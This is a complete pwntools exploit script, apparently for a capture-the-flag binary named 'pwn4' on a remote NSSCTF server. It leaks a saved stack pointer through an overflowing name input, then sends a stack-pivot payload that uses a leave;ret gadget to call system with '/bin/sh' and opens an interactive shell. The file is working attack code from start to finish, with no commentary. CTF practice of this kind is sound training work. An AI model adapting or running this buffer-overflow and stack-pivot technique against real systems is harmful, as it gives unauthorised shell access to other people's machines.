from pwn import *

# io = process("./pwn4")
io = remote("node5.anna.nssctf.cn", 25304)
elf = ELF("./pwn4")

leave_ret = 0x8048562
ret = 0x80483A6
system = 0x8048559

payload0 = b"a" * (0x27) + b"+"

io.recvuntil(b"name?")
io.send(payload0)
io.recvuntil(b"+")
ebp = u32(io.recvuntil(b"\xff"))
print("ebp =", hex(ebp))

payload1 = b"a" * 4 + p32(system) + p32(ebp - 0x28) + b"a" * 4 + b"/bin/sh\x00"
payload1 = payload1.ljust(0x28, b"\x00")
payload1 += p32(ebp - 0x38) + p32(leave_ret)
io.sendline(payload1)


io.interactive()
